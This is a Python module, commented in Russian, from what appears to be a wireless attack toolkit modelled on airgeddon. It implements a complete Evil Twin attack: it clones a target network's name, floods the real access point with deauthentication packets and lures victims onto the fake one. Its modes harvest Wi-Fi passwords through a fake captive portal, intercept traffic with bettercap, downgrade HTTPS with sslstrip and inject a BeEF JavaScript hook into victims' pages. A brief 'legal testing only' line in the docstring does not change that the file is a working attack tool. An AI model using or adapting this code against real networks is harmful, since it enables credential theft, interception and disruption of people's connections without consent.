"""Evil Twin: поддельная точка доступа — набор режимов как в airgeddon.

Подменю (как у airgeddon Evil Twin):
  1. Just AP                — только двойник + деаут, без портала и сниффинга
  2. Captive portal         — портал с вводом пароля + проверка по handshake
  3. Sniffing               — MITM: интернет жертве через аплинк + bettercap
  4. Sniffing + sslstrip2   — то же + bettercap hstshijack (понижение HTTPS)
  5. Sniffing + BeEF        — то же + BeEF (внедрение JS-хука в HTTP)

Общее для всех: открытая AP с ESSID цели (hostapd), DHCP/DNS (dnsmasq),
деаутентификация реальной сети (1 адаптер через монитор-VIF, либо 2-й адаптер),
аккуратная уборка (iptables/ip_forward/режимы/NetworkManager).

Только для легального тестирования своих сетей.
"""

import os
import sys
import time
import shutil
import tempfile
import subprocess
from pathlib import Path

from . import iface
from .system import missing_tools
from .ui import ask_yes_no
from .terminal import kill_group
from .i18n import t
from .netscan import scan_networks, choose_network, ask_scan_duration
from .constants import (
    TOOLS_EVIL_TWIN, BASE_DIR, EVIL_TWIN_DIR, PORTAL_TEMPLATES_DIR,
    PORTAL_BUILTIN_DIR, PORTAL_CAPTURED_FILE,
    AP_GATEWAY_IP, AP_NETMASK, AP_DHCP_START, AP_DHCP_END, PORTAL_PORT,
    UPSTREAM_DNS, BEEF_PORT,
)

# Режимы (ключ меню -> (id, i18n-ключ описания, нужен ли сниффинг/интернет))
MODES = [
    ("1", "just_ap",  "et.mode_just_ap", False),
    ("2", "captive",  "et.mode_captive", False),
    ("3", "sniff",    "et.mode_sniff", True),
    ("4", "sslstrip", "et.mode_sslstrip", True),
    ("5", "beef",     "et.mode_beef", True),
]
SNIFF_MODES = {"sniff", "sslstrip", "beef"}


# ============ Шаблоны портала ============

def _template_dirs(base):
    if not base.exists():
        return []
    return sorted(d for d in base.iterdir()
                  if d.is_dir() and (d / "index.html").exists())


def list_templates():
    out = []
    for d in _template_dirs(PORTAL_BUILTIN_DIR):
        out.append((d.name, d, "встроенный"))
    for d in _template_dirs(PORTAL_TEMPLATES_DIR):
        out.append((d.name, d, "свой"))
    return out


def _unique_template_dir(name):
    safe = "".join(c if (c.isalnum() or c in "-_.") else "_" for c in name) or "portal"
    dest = PORTAL_TEMPLATES_DIR / safe
    n = 1
    while dest.exists():
        dest = PORTAL_TEMPLATES_DIR / f"{safe}_{n}"
        n += 1
    return dest


def add_template():
    raw = input(t("et.add_path")).strip()
    if not raw:
        return
    src = Path(raw).expanduser()
    if not src.exists():
        print(t("et.not_found", src=src))
        return
    PORTAL_TEMPLATES_DIR.mkdir(parents=True, exist_ok=True)
    name = input(t("et.tpl_name")).strip() or src.stem
    dest = _unique_template_dir(name)
    try:
        if src.is_dir():
            if not (src / "index.html").exists():
                print(t("et.no_index_dir"))
                return
            shutil.copytree(src, dest)
        elif src.suffix.lower() in (".html", ".htm"):
            dest.mkdir(parents=True)
            shutil.copy2(src, dest / "index.html")
        else:
            print(t("et.expect_html"))
            return
    except Exception as e:
        print(t("et.tpl_add_fail", e=e))
        return
    print(t("et.tpl_added", name=dest.name, path=dest))
    print(t("et.tpl_hint"))


def choose_template():
    while True:
        templates = list_templates()
        print(t("et.tpl_title"))
        if not templates:
            print(t("et.tpl_none"))
        for i, (name, _path, source) in enumerate(templates, 1):
            print(f"  {i}. {name}  [{source}]")
        print(t("et.tpl_add_item"))
        print(t("et.cancel_item"))
        choice = input(t("et.tpl_choose")).strip().lower()
        if choice == "0":
            return None
        if choice == "a":
            add_template()
            continue
        try:
            idx = int(choice) - 1
        except ValueError:
            print(t("common.unknown_item"))
            continue
        if 0 <= idx < len(templates):
            return templates[idx][1]
        print(t("common.unknown_item"))


# ============ Выбор режима / адаптеров / метода ============

def _choose_mode():
    print(t("et.mode_title"))
    for key, _id, desc, _sniff in MODES:
        print(f"  {key}. {t(desc)}")
    print(t("et.mode_back"))
    valid = {k: i for k, i, _d, _s in MODES}
    while True:
        c = input(t("et.mode_prompt")).strip()
        if c == "0":
            return None
        if c in valid:
            return valid[c]
        print(t("common.unknown_item"))


def choose_attack_adapter(ap_interface):
    """2-й адаптер для деаута или None (тогда деаут пойдёт через монитор-VIF)."""
    if not ask_yes_no("\n[?] Использовать 2-й адаптер для атаки (деаутентификация)?",
                       default=False):
        return None
    others = [i for i in iface.list_wifi_interfaces() if i != ap_interface]
    if not others:
        print(t("et.no_other_adapters"))
        return None
    print(t("et.pick_attack"))
    for i, name in enumerate(others, 1):
        mode, _ = iface.get_wifi_info(name)
        print(f"  {i}. {name}  ({mode})")
    while True:
        choice = input(t("et.attack_prompt")).strip()
        if choice == "0":
            return None
        try:
            idx = int(choice) - 1
        except ValueError:
            print(t("et.enter_num"))
            continue
        if 0 <= idx < len(others):
            return others[idx]
        print(t("et.num_1n", n=len(others)))


def choose_deauth_method():
    """Метод деаутентификации: aireplay-ng (есть всегда) или mdk4 (если стоит)."""
    methods = [("aireplay", "aireplay-ng --deauth (стандартный)")]
    if _have("mdk4"):
        methods.append(("mdk4", "mdk4 (агрессивнее, нужен пакет mdk4)"))
    if len(methods) == 1:
        return "aireplay"
    print(t("et.deauth_method_title"))
    for i, (_id, desc) in enumerate(methods, 1):
        print(f"  {i}. {t(desc)}")
    while True:
        c = input(t("et.method_prompt")).strip()
        if c == "":
            return methods[0][0]
        try:
            idx = int(c) - 1
        except ValueError:
            print(t("et.enter_num"))
            continue
        if 0 <= idx < len(methods):
            return methods[idx][0]
        print(t("common.unknown_item"))


def _default_uplink():
    """Интерфейс с маршрутом в интернет (ip route get 1.1.1.1)."""
    r = subprocess.run(["ip", "route", "get", "1.1.1.1"],
                       capture_output=True, text=True)
    for tok in r.stdout.split():
        if tok == "dev":
            parts = r.stdout.split()
            return parts[parts.index("dev") + 1]
    return None


def choose_uplink(exclude):
    """Выбор интерфейса с интернетом (для раздачи жертве через NAT)."""
    default = _default_uplink()
    r = subprocess.run(["ip", "-o", "link", "show"], capture_output=True, text=True)
    ifaces = []
    for line in r.stdout.splitlines():
        # формат: "2: eth0: <...>"
        parts = line.split(":")
        if len(parts) >= 2:
            name = parts[1].strip().split("@")[0]
            if name and name != "lo" and name not in exclude:
                ifaces.append(name)
    if not ifaces:
        print(t("et.no_uplink"))
        return None
    print(t("et.uplink_title"))
    for i, name in enumerate(ifaces, 1):
        tag = t("et.uplink_default") if name == default else ""
        print(f"  {i}. {name}{tag}")
    while True:
        c = input(t("et.uplink_prompt", d=default or "1")).strip()
        if c == "" and default in ifaces:
            return default
        if c == "":
            return ifaces[0]
        try:
            idx = int(c) - 1
        except ValueError:
            print(t("et.enter_num"))
            continue
        if 0 <= idx < len(ifaces):
            return ifaces[idx]
        print(t("et.num_1n", n=len(ifaces)))


# ============ Низкоуровневое ============

def _run(cmd, **kw):
    kw.setdefault("stdout", subprocess.DEVNULL)
    kw.setdefault("stderr", subprocess.DEVNULL)
    return subprocess.run(cmd, **kw)


def _have(tool):
    return shutil.which(tool) is not None


def _bg(cmd, log_path):
    log = open(log_path, "w")
    return subprocess.Popen(cmd, stdout=log, stderr=subprocess.STDOUT,
                            preexec_fn=os.setsid)


def _tail(path, n=15):
    try:
        with open(path, "r", errors="ignore") as f:
            return "".join(f.readlines()[-n:])
    except Exception:
        return "(лог недоступен)"


def _free_port53():
    _run(["pkill", "-f", "dnsmasq.*eviltwin"])


def _hostapd_conf(path, ap_iface, essid, channel):
    hw_mode = "a" if channel.isdigit() and int(channel) > 14 else "g"
    path.write_text(
        f"interface={ap_iface}\n"
        f"driver=nl80211\n"
        f"ssid={essid}\n"
        f"hw_mode={hw_mode}\n"
        f"channel={channel}\n"
        f"auth_algs=1\n"
        f"ignore_broadcast_ssid=0\n"
    )
    return path


def _dnsmasq_conf(path, ap_iface, captive):
    """captive=True -> все домены на портал; иначе -> форвард в реальный DNS."""
    base = (
        f"interface={ap_iface}\n"
        f"bind-interfaces\n"
        f"listen-address={AP_GATEWAY_IP}\n"
        f"dhcp-authoritative\n"
        f"dhcp-range={AP_DHCP_START},{AP_DHCP_END},{AP_NETMASK},12h\n"
        f"dhcp-option=3,{AP_GATEWAY_IP}\n"
        f"dhcp-option=6,{AP_GATEWAY_IP}\n"
    )
    if captive:
        base += f"address=/#/{AP_GATEWAY_IP}\nno-resolv\n"
    else:
        base += f"server={UPSTREAM_DNS}\n"
    base += "log-queries\n"
    path.write_text(base)
    return path


# ============ Основной сценарий ============

def evil_twin_flow(ap_interface):
    missing = missing_tools(TOOLS_EVIL_TWIN)
    if missing:
        print(t("common.tools_missing", tools=", ".join(missing)))
        print(t("et.et_install"))
        return

    mode = _choose_mode()
    if mode is None:
        return

    # Внешние зависимости под режим
    if mode in SNIFF_MODES and not _have("bettercap"):
        print(t("et.need_bettercap"))
        return
    if mode == "beef" and not (_have("beef-xss") or _have("beef")):
        print(t("et.need_beef"))
        return

    print(t("et.mode_line", mode=mode, ap=ap_interface))

    # --- Скан + цель (нужен monitor) ---
    if iface.get_interface_mode(ap_interface).lower() != "monitor":
        iface.set_monitor_mode(ap_interface)
    tmp_dir = Path(tempfile.mkdtemp(prefix="eviltwin_"))
    target = None
    try:
        duration = ask_scan_duration()
        networks = scan_networks(ap_interface, duration, tmp_dir)
        if not networks:
            print(t("scan.none"))
            return
        target = choose_network(networks)
    finally:
        if target is None:
            shutil.rmtree(tmp_dir, ignore_errors=True)
    if target is None:
        return

    essid = target["essid"] or ""
    bssid = target["bssid"]
    channel = target["channel"]
    if not essid:
        print(t("et.hidden_essid"))
        shutil.rmtree(tmp_dir, ignore_errors=True)
        return

    # --- Параметры под режим ---
    template = None
    handshake = None
    uplink = None

    if mode == "captive":
        print(t("et.choose_site", essid=essid))
        template = choose_template()
        if template is None:
            print(t("common.cancelled"))
            shutil.rmtree(tmp_dir, ignore_errors=True)
            return
        if ask_yes_no("\n[?] Проверять пароль по handshake (.cap)?", default=False):
            hs = input(t("et.hs_path")).strip()
            if hs and Path(hs).expanduser().exists():
                handshake = str(Path(hs).expanduser())
            else:
                print(t("et.hs_missing"))

    if mode in SNIFF_MODES:
        uplink = choose_uplink(exclude={ap_interface})
        if uplink is None:
            print(t("et.no_uplink_mode"))
            shutil.rmtree(tmp_dir, ignore_errors=True)
            return

    # --- Деаут ---
    print(t("et.deauth_hdr"))
    attack_iface = choose_attack_adapter(ap_interface)
    method = choose_deauth_method()

    cfg = dict(ap_interface=ap_interface, attack_iface=attack_iface,
               method=method, mode=mode, essid=essid, bssid=bssid,
               channel=channel, template=template, handshake=handshake,
               uplink=uplink, tmp_dir=tmp_dir)
    _start_attack(cfg)


def _start_attack(cfg):
    ap = cfg["ap_interface"]
    mode = cfg["mode"]
    channel = cfg["channel"]
    bssid = cfg["bssid"]
    essid = cfg["essid"]
    tmp_dir = cfg["tmp_dir"]
    captive = (mode == "captive")

    procs = []
    nmcli = _have("nmcli")
    ipt_backup = tmp_dir / "iptables.backup"
    changed_forward = False
    created_vif = None

    print(t("et.starting"))
    EVIL_TWIN_DIR.mkdir(parents=True, exist_ok=True)

    try:
        if _have("iptables-save"):
            with open(ipt_backup, "w") as f:
                subprocess.run(["iptables-save"], stdout=f)

        # AP-адаптер в managed (hostapd сам сделает master)
        if nmcli:
            _run(["nmcli", "dev", "set", ap, "managed", "no"])
        if _have("rfkill"):
            _run(["rfkill", "unblock", "wifi"])
        _run(["ip", "link", "set", ap, "down"])
        _run(["iw", "dev", ap, "set", "type", "managed"])
        _run(["ip", "link", "set", ap, "up"])

        # hostapd
        hostapd_conf = _hostapd_conf(tmp_dir / "hostapd.conf", ap, essid, channel)
        hostapd = _bg(["hostapd", str(hostapd_conf)], tmp_dir / "hostapd.log")
        procs.append(("hostapd", hostapd))
        time.sleep(3)
        if hostapd.poll() is not None:
            print(t("et.hostapd_fail"))
            print(_tail(tmp_dir / "hostapd.log"))
            raise RuntimeError("hostapd failed")

        # IP на AP
        _run(["ip", "addr", "flush", "dev", ap])
        _run(["ip", "addr", "add", f"{AP_GATEWAY_IP}/24", "dev", ap])
        _run(["ip", "link", "set", ap, "up"])

        # dnsmasq
        _free_port53()
        dnsmasq_conf = _dnsmasq_conf(tmp_dir / "dnsmasq.conf", ap, captive)
        dnsmasq = _bg(["dnsmasq", "-d", "-C", str(dnsmasq_conf)], tmp_dir / "dnsmasq.log")
        procs.append(("dnsmasq", dnsmasq))
        time.sleep(1.5)
        if dnsmasq.poll() is not None:
            print(t("et.dnsmasq_fail"))
            print(_tail(tmp_dir / "dnsmasq.log"))
            print(t("et.free53"))
            raise RuntimeError("dnsmasq failed")

        # iptables + ip_forward под режим
        changed_forward = _setup_iptables(cfg)

        # Сервисы под режим (портал / bettercap / beef)
        _start_mode_services(cfg, procs)

        # Деаутентификация
        created_vif = _start_deauth(cfg, procs, tmp_dir)

        _status(cfg)
        _watch(cfg, procs)

    except KeyboardInterrupt:
        print(t("et.stopping"))
    except Exception as e:
        print(t("et.error", e=e))
    finally:
        _cleanup(cfg, procs, nmcli,
                 ipt_backup if ipt_backup.exists() else None,
                 changed_forward, created_vif)
        if captive:
            _show_captured()
        shutil.rmtree(tmp_dir, ignore_errors=True)


def _setup_iptables(cfg):
    """Настраивает iptables под режим. Возвращает True, если менял ip_forward."""
    ap = cfg["ap_interface"]
    mode = cfg["mode"]
    uplink = cfg["uplink"]

    _run(["iptables", "-P", "INPUT", "ACCEPT"])
    _run(["iptables", "-P", "OUTPUT", "ACCEPT"])
    _run(["iptables", "-P", "FORWARD", "ACCEPT"])
    _run(["iptables", "--flush"])
    _run(["iptables", "-t", "nat", "--flush"])
    for proto, dport in (("udp", "53"), ("tcp", "53"), ("udp", "67"), ("tcp", "80")):
        _run(["iptables", "-A", "INPUT", "-i", ap, "-p", proto, "--dport", dport,
              "-j", "ACCEPT"])

    if mode == "captive":
        # без интернета, весь HTTP -> портал, HTTPS отбиваем
        _run(["sysctl", "-w", "net.ipv4.ip_forward=0"])
        _run(["iptables", "-t", "nat", "-A", "PREROUTING", "-i", ap,
              "-p", "tcp", "--dport", "80", "-j", "DNAT",
              "--to-destination", f"{AP_GATEWAY_IP}:{PORTAL_PORT}"])
        _run(["iptables", "-A", "INPUT", "-i", ap, "-p", "tcp", "--dport", "443",
              "-j", "REJECT"])
        return True

    if mode == "just_ap":
        # просто открытая точка, без интернета и перехвата
        _run(["sysctl", "-w", "net.ipv4.ip_forward=0"])
        return True

    # sniffing-режимы: NAT в интернет через аплинк (жертве нужен рабочий инет)
    _run(["sysctl", "-w", "net.ipv4.ip_forward=1"])
    _run(["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", uplink, "-j", "MASQUERADE"])
    _run(["iptables", "-A", "FORWARD", "-i", uplink, "-o", ap,
          "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"])
    _run(["iptables", "-A", "FORWARD", "-i", ap, "-o", uplink, "-j", "ACCEPT"])
    if cfg["mode"] in ("beef",):
        # пустим hook.js порт BeEF
        _run(["iptables", "-A", "INPUT", "-i", ap, "-p", "tcp", "--dport",
              str(BEEF_PORT), "-j", "ACCEPT"])
    return True


def _start_mode_services(cfg, procs):
    ap = cfg["ap_interface"]
    mode = cfg["mode"]
    tmp_dir = cfg["tmp_dir"]

    if mode == "captive":
        portal_cmd = [sys.executable, "-m", "wifitool.portal_server",
                      "--root", str(cfg["template"]), "--essid", cfg["essid"],
                      "--creds", str(PORTAL_CAPTURED_FILE), "--port", str(PORTAL_PORT)]
        if cfg["handshake"]:
            portal_cmd += ["--handshake", cfg["handshake"], "--bssid", cfg["bssid"]]
        portal = subprocess.Popen(portal_cmd, cwd=str(BASE_DIR), preexec_fn=os.setsid)
        procs.append(("portal", portal))
        time.sleep(1)
        if portal.poll() is not None:
            print(t("et.portal_fail", port=PORTAL_PORT))
            raise RuntimeError("portal failed")
        return

    if mode == "just_ap":
        return

    # sniffing / sslstrip / beef — bettercap на AP-интерфейсе
    if mode == "beef":
        beef_bin = "beef-xss" if _have("beef-xss") else "beef"
        beef = _bg([beef_bin], tmp_dir / "beef.log")
        procs.append(("beef", beef))
        time.sleep(2)

    caplet = _write_caplet(cfg, tmp_dir)
    bettercap = _bg(["bettercap", "-iface", ap, "-caplet", str(caplet)],
                    tmp_dir / "bettercap.log")
    procs.append(("bettercap", bettercap))
    time.sleep(2)
    if bettercap.poll() is not None:
        print(t("et.bettercap_fail"))
        print(_tail(tmp_dir / "bettercap.log"))
        raise RuntimeError("bettercap failed")


def _write_caplet(cfg, tmp_dir):
    """Готовит .cap для bettercap под режим sniffing/sslstrip/beef."""
    mode = cfg["mode"]
    log = tmp_dir / "bettercap_events.log"
    lines = [
        f"set events.stream.output {log}",
        "net.probe on",
        "net.sniff on",
    ]
    if mode in ("sslstrip", "beef"):
        # понижение HTTPS + перехват (встроенный caplet bettercap)
        lines += [
            "set http.proxy.sslstrip true",
            "set net.sniff.verbose false",
            "http.proxy on",
        ]
    if mode == "beef":
        hook = f"http://{AP_GATEWAY_IP}:{BEEF_PORT}/hook.js"
        lines += [f"set http.proxy.injectjs {hook}"]
    caplet = tmp_dir / "et.cap"
    caplet.write_text("\n".join(lines) + "\n")
    return caplet


def _start_deauth(cfg, procs, tmp_dir):
    """Запускает деаут. Возвращает имя созданного VIF (или None)."""
    ap = cfg["ap_interface"]
    bssid = cfg["bssid"]
    channel = cfg["channel"]
    attack_iface = cfg["attack_iface"]
    method = cfg["method"]
    created_vif = None

    if attack_iface:
        iface.set_monitor_mode(attack_iface)
        iface.set_channel(attack_iface, channel)
        deauth_iface = attack_iface
    else:
        vif = iface.add_monitor_vif(ap)
        if vif:
            created_vif = vif
            deauth_iface = vif
            print(t("et.vif_made", vif=vif))
        else:
            print(t("et.vif_fail"))
            return None

    if method == "mdk4" and _have("mdk4"):
        # mdk4 deauth: список BSSID в файле
        bl = tmp_dir / "bssid.txt"
        bl.write_text(bssid + "\n")
        deauth = _bg(["mdk4", deauth_iface, "d", "-b", str(bl), "-c", str(channel)],
                     tmp_dir / "deauth.log")
    else:
        deauth = _bg(["aireplay-ng", "--deauth", "0", "-a", bssid, deauth_iface],
                     tmp_dir / "deauth.log")
    procs.append(("deauth", deauth))
    print(t("et.deauth_run", method=method, iface=deauth_iface, bssid=bssid))
    return created_vif


def _status(cfg):
    print("\n" + "=" * 60)
    print(t("et.st_running", mode=cfg["mode"]))
    print("=" * 60)
    print(t("et.st_twin", essid=cfg["essid"], ch=cfg["channel"]))
    print(t("et.st_bssid", bssid=cfg["bssid"]))
    print(t("et.st_ap", ap=cfg["ap_interface"], ip=AP_GATEWAY_IP))
    print(t("et.st_deauth", method=cfg["method"],
            iface=cfg["attack_iface"] or t("et.st_vif")))
    if cfg["mode"] == "captive":
        print(t("et.st_portal", name=cfg["template"].name))
        print(t("et.st_check", v=t("et.st_check_hs") if cfg["handshake"]
                               else t("et.st_check_no")))
    if cfg["mode"] in SNIFF_MODES:
        print(t("et.st_uplink", uplink=cfg["uplink"]))
        print(t("et.st_logs"))
    print("=" * 60)
    print(t("et.st_stop"))


def _watch(cfg, procs):
    pmap = dict(procs)
    captive = (cfg["mode"] == "captive")
    last_size = (PORTAL_CAPTURED_FILE.stat().st_size
                 if captive and PORTAL_CAPTURED_FILE.exists() else 0)
    # ключевой процесс, чья смерть = конец
    key = "portal" if captive else ("bettercap" if cfg["mode"] in SNIFF_MODES else "hostapd")
    while True:
        time.sleep(1)
        proc = pmap.get(key)
        if proc is not None and proc.poll() is not None:
            print(t("et.proc_stopped", key=key))
            break
        if captive and PORTAL_CAPTURED_FILE.exists():
            size = PORTAL_CAPTURED_FILE.stat().st_size
            if size > last_size:
                with open(PORTAL_CAPTURED_FILE, "r", encoding="utf-8",
                          errors="ignore") as f:
                    f.seek(last_size)
                    chunk = f.read().strip()
                last_size = size
                if chunk:
                    print(chunk)


def _cleanup(cfg, procs, nmcli, ipt_backup, changed_forward, created_vif):
    ap = cfg["ap_interface"]
    attack_iface = cfg["attack_iface"]
    print(t("et.cleanup"))
    for _name, proc in reversed(procs):
        kill_group(proc)

    if created_vif:
        iface.del_interface(created_vif)

    _run(["iptables", "--flush"])
    _run(["iptables", "-t", "nat", "--flush"])
    if ipt_backup and _have("iptables-restore"):
        try:
            with open(ipt_backup) as f:
                subprocess.run(["iptables-restore"], stdin=f)
        except Exception:
            pass
    if changed_forward:
        _run(["sysctl", "-w", "net.ipv4.ip_forward=1"])

    _run(["ip", "addr", "flush", "dev", ap])
    _run(["ip", "link", "set", ap, "down"])
    _run(["iw", "dev", ap, "set", "type", "managed"])
    _run(["ip", "link", "set", ap, "up"])
    if nmcli:
        _run(["nmcli", "dev", "set", ap, "managed", "yes"])
    if attack_iface:
        iface.set_managed_mode(attack_iface)

    print(t("et.cleanup_done"))


def _show_captured():
    if not PORTAL_CAPTURED_FILE.exists():
        return
    print("\n" + "=" * 60)
    print(t("et.captured_title"))
    print("=" * 60)
    print(t("et.captured_file", f=PORTAL_CAPTURED_FILE))
    try:
        with open(PORTAL_CAPTURED_FILE, "r", encoding="utf-8", errors="ignore") as f:
            data = f.read().strip()
        print(data if data else t("et.empty"))
    except Exception:
        pass
